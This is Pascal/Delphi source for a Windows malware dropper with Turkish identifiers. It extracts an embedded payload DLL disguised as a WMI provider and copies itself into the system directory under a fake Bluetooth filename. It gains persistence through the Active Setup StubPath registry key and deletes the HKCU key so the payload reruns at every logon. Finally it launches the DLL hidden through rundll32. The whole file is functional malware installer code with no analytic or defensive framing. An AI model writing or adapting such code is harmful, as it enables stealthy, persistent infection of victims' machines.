program ins32;

{$R 'rsrc.res' 'rsrc.rc'}

uses
  Windows;

CONST
GUID='{FF183EB2-3E1E-4D2D-9C94-48684ED9ED3D}';
calistirilacak='rundll32.exe wmiprvce32.dll CheckService';
tashaklisim='bthstck32.exe';

function StrPas(const Str: PChar): string;
begin
  Result := Str;
end;

function sysdizini : string;
var
  a : Array[0..144] of char;
begin
  GetSystemDirectory(a, sizeof(a));
  result:=StrPas(a);
end;

function windizini : string;
var
  a : Array[0..144] of char;
begin
  GetWindowsDirectory(a, sizeof(a));
  result:=StrPas(a);
end;

procedure Extract(Path:String);
var
  ResourceLocation: HRSRC;
  ResourceSize, BytesWritten: Longword;
  ResDataHandle: THandle;
  FileHandle: THandle;
  ResourcePointer: pchar;
begin
ResourceLocation := FindResource(HInstance, pchar('PSY'), RT_RCDATA);
if ResourceLocation <> 0 then
  begin
  ResourceSize := SizeofResource(HInstance, ResourceLocation);
    if ResourceSize <> 0 then
    begin
    ResDataHandle := LoadResource(HInstance, ResourceLocation);
      if ResDataHandle <> 0 then
      begin
      ResourcePointer := LockResource(ResDataHandle);
        if ResourcePointer <> nil then
        begin
        FileHandle := CreateFile(PChar(Path), GENERIC_WRITE, FILE_SHARE_WRITE, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
          if FileHandle <> INVALID_HANDLE_VALUE then
          begin
          WriteFile(FileHandle, ResourcePointer^, ResourceSize, BytesWritten, nil);
          CloseHandle(FileHandle);
          end;
        end;
      end;
    end;
  end;
end;

function regyaz(key:Hkey; subkey,name,value:string):boolean;
var
regkey:hkey;
begin
  result := false;
  RegCreateKey(key,PChar(subkey),regkey);
  if RegSetValueEx(regkey,Pchar(name),0,REG_EXPAND_SZ,pchar(value),length(value)) = 0 then
    result := true;
  RegCloseKey(regkey);
end;

begin
Extract(windizini+'\wmiprvce32.dll');
sleep(3);
CopyFile(PChar(Paramstr(0)),PChar(sysdizini+'\'+tashaklisim),False);
regyaz(HKEY_LOCAL_MACHINE, 'SOFTWARE\Microsoft\Active Setup\Installed Components\'+GUID,'StubPath',sysdizini+'\'+tashaklisim);
RegDeleteKey(HKEY_current_user,'SOFTWARE\Microsoft\Active Setup\Installed Components\'+GUID);
sleep(1);
Winexec(pchar(calistirilacak), SW_HIDE);
end.
